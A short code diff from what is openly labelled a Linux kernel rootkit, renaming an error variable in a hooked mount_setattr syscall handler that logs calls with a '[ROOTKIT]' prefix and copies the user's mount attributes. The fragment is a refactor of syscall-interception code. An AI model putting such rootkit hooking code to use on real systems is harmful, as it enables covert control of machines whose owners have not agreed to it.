@@ -99,7 +99,7 @@ SYSCALL_HOOK_HANDLER5(mount_setattr, orig_mount_setattr, p_regs, int, i32_dfd, c
                       s_path, unsigned int, ui32_flags, struct mount_attr __user *, p_uattr, size_t,
                       sz_usize)
 {
-    int i_err;
+    int i32_err;
     struct mount_attr attr;
 
     pr_info("[ROOTKIT] mount_setattr(%d, %p, %#x, %p, %zu)\n", i32_dfd, s_path, ui32_flags, p_uattr,
@@ -119,9 +119,9 @@ SYSCALL_HOOK_HANDLER5(mount_setattr, orig_mount_setattr, p_regs, int, i32_dfd, c
         return -EINVAL;
     }
 
-    i_err = copy_struct_from_user(&attr, sizeof(attr), p_uattr, sz_usize);
-    if (i_err) {
-        return i_err;
+    i32_err = copy_struct_from_user(&attr, sizeof(attr), p_uattr, sz_usize);
+    if (i32_err) {
+        return i32_err;
     }
 
     if (attr.attr_set == 0 && attr.attr_clr == 0 && attr.propagation == 0) {
